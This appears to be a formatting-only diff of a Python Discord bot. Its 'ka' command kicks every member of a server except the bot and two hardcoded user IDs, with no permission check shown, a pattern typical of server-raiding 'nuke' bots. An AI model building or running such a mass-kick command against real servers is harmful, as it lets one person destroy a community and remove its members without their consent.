@@ -15,16 +15,22 @@ bot = commands.Bot(
     intents=intents,
 )
 
+
 @bot.command()
 async def ka(ctx):
     g = ctx.message.channel.guild
     for user in ctx.message.channel.guild.members:
         try:
-            if user.id != bot.user.id and user.id != 117445905572954121 and user.id != 939618169218293822:
+            if (
+                user.id != bot.user.id
+                and user.id != 117445905572954121
+                and user.id != 939618169218293822
+            ):
                 await ctx.send("Kicking " + user.display_name)
                 await g.kick(user)
         except Exception as e:
             await ctx.send(str(e))
+
 
 @bot.event
 async def on_ready():
@@ -66,5 +72,6 @@ async def on_ready():
                 print(str(e))
 
     """
+
 
 bot.run()
